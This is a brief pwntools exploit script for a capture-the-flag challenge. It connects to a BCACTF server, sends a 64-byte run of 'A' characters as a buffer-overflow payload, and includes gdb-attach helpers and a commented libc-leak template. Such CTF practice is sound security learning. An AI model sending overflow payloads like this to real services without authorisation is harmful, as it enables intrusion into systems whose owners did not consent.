from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

# vuln_path = "./pwn"
# elf = ELF(vuln_path)
# libc = elf.libc

io = remote("challs.bcactf.com", 44123)


def ddebug(b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()

# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))

io.recvline()
payload = b"A" * 64 + b"\n"
io.sendline(payload)
io.recvall()

io.interactive()
